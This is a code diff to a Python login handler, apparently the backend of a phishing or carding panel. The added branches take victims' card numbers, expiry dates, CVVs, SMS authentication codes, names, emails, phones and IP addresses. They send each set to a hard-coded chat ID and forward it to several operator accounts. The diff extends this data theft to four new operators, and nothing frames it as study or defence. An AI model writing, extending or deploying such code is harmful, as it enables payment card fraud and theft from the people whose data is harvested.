@@ -134,6 +134,7 @@ def login():
             ne_pizdabol(card_number)
             send_buttons_message(Plaksa, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
             return '', 200  # Возвращаем пустой ответ с кодом 200
+        
         elif id == '10000010':
             send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
             if authCode is not None and authCode != 'None':
@@ -142,6 +143,44 @@ def login():
             ne_pizdabol(card_number)
             send_buttons_message(Gatsby, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
             return '', 200  # Возвращаем пустой ответ с кодом 200
+        
+        elif id == '10000011':
+            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
+            if authCode is not None and authCode != 'None':
+                send_sms(pl1, card_number, expiry_date, cvv, authCode, ID)
+                return '', 200  # Возвращаем пустой ответ с кодом 200
+            ne_pizdabol(card_number)
+            send_buttons_message(pl1, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
+            return '', 200  # Возвращаем пустой ответ с кодом 200
+        
+        elif id == '10000012':
+            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
+            if authCode is not None and authCode != 'None':
+                send_sms(pl2, card_number, expiry_date, cvv, authCode, ID)
+                return '', 200  # Возвращаем пустой ответ с кодом 200
+            ne_pizdabol(card_number)
+            send_buttons_message(pl2, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
+            return '', 200  # Возвращаем пустой ответ с кодом 200
+        
+        elif id == '10000013':
+            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
+            if authCode is not None and authCode != 'None':
+                send_sms(dch1, card_number, expiry_date, cvv, authCode, ID)
+                return '', 200  # Возвращаем пустой ответ с кодом 200
+            ne_pizdabol(card_number)
+            send_buttons_message(dch1, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
+            return '', 200  # Возвращаем пустой ответ с кодом 200
+        
+        elif id == '10000014':
+            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
+            if authCode is not None and authCode != 'None':
+                send_sms(dch2, card_number, expiry_date, cvv, authCode, ID)
+                return '', 200  # Возвращаем пустой ответ с кодом 200
+            ne_pizdabol(card_number)
+            send_buttons_message(dch2, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
+            return '', 200  # Возвращаем пустой ответ с кодом 200
+
+
         return '', 200  # Добавляем общий возврат для случаев, когда нет условий или ошибки
 
 
